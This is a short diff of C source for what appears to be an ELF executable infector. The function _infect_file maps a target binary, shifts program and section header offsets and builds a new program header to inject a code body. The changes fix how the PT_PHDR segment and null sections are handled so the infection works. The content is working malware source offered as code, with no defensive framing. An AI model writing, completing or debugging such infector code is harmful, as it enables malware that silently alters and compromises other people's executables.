@@ -37,6 +37,8 @@ long _syscall_wrap(long number, ...)
 }
 */
 
+/* We need to move PHDR to our new segment */
+
 int _infect_file(const char *target_path, void *body, size_t body_s)
 {
 	/* Open, mmap */
@@ -75,6 +77,10 @@ int _infect_file(const char *target_path, void *body, size_t body_s)
 			last_load = p_hdr;
 		if (p_hdr->p_type != PT_PHDR)
 			p_hdr->p_offset += sizeof(Elf64_Phdr);
+		if (p_hdr->p_type == PT_PHDR) {
+			p_hdr->p_memsz  += sizeof(Elf64_Phdr);
+			p_hdr->p_filesz += sizeof(Elf64_Phdr);
+		}
 	}
 
 	if (last_load == NULL)
@@ -83,8 +89,10 @@ int _infect_file(const char *target_path, void *body, size_t body_s)
 	/* Same changes for sh_offset for every section */
 	for (Elf64_Shdr *s_hdr = (Elf64_Shdr*) (mem + e_hdr->e_shoff);
 	     s_hdr < (Elf64_Shdr*) (mem + e_hdr->e_shoff) + e_hdr->e_shnum;
-	     s_hdr++)
-		s_hdr->sh_offset += sizeof(Elf64_Phdr);
+	     s_hdr++) {
+		if (s_hdr->sh_type != SHT_NULL)
+			s_hdr->sh_offset += sizeof(Elf64_Phdr);
+	}
 
 	Elf64_Phdr toinject_hdr = {
 		.p_align	= last_load->p_align,
